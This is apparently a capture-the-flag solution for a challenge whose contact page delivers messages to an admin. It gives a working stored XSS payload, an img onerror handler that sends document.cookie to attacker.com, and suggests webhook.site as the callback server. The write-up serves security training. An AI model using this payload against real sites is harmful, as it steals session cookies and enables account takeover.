# Solution
- We have a `contact` page that allows us to send a message to the admin.
- We want to steal the admin's cookie, using an XSS attack.
```html
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
```
- Replace `attacker.com` with your callback server. You can use `https://webhook.site`.
